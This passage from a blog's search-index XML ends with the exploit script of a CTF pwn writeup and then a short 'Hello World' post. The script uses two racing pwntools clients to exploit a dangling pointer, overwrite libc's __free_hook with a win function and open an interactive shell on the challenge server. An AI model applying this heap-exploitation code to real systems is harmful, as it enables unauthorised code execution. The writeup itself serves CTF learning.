class="hljs-number">1</span>)<br>    <span class="hljs-comment"># write free_hook</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;6&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, p64(win))<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>    sig = <span class="hljs-number">3</span><br><br>    info(<span class="hljs-string">&quot;[Thread-1] Good bye&quot;</span>)<br>    r.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">client02</span>():<br>    <span class="hljs-keyword">global</span> sig<br><br>    <span class="hljs-comment">#r = remote(&quot;0.0.0.0&quot;, 8080)</span><br>    r = remote(HOST, PORT)<br><br>    r.recvline()<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;c02&quot;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> (sig == <span class="hljs-number">1</span>): <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-comment"># get chest</span><br>    info(<span class="hljs-string">&quot;[Thread-2] Get chest dangling pointer&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>) <span class="hljs-comment"># choice</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>) <span class="hljs-comment"># x</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>) <span class="hljs-comment"># y</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>) <span class="hljs-comment"># backpack slot</span><br><br>    time.sleep(<span class="hljs-number">20</span>)<br><br>    <span class="hljs-comment"># put it into map</span><br>    info(<span class="hljs-string">&quot;[Thread-2] Get a chunk on free_hook&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>) <span class="hljs-comment"># choice</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>) <span class="hljs-comment"># x</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>) <span class="hljs-comment"># y</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>) <span class="hljs-comment"># backpack slot</span><br><br>    <span class="hljs-comment"># rename</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    freehook = libc + <span class="hljs-number">0x1eee48</span><br>    r.sendafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, p64(freehook))<br><br>    sig = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> (sig == <span class="hljs-number">3</span>): <span class="hljs-keyword">pass</span><br><br>    info(<span class="hljs-string">&quot;[Thread-2] Win&quot;</span>)<br><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br><br>    r.interactive()<br><br><span class="hljs-comment">#threading.Thread(target=server).start()</span><br>threading.Thread(target=client01).start()<br>threading.Thread(target=client02).start()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>writeups</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/04/19/Hello-World/"/>
    <url>/2025/04/19/Hello-World/</url>
    
    <content type="html"><![CDATA[<p>Hello, world!</p><p>白上フブキ好可愛啊，最可愛的狐狸!!!</p><p><img src="/2025/04/19/Hello-World/fbk.gif"></p>]]></content>
    
    
    <categories>
      
      <category>hello world</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hello world</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
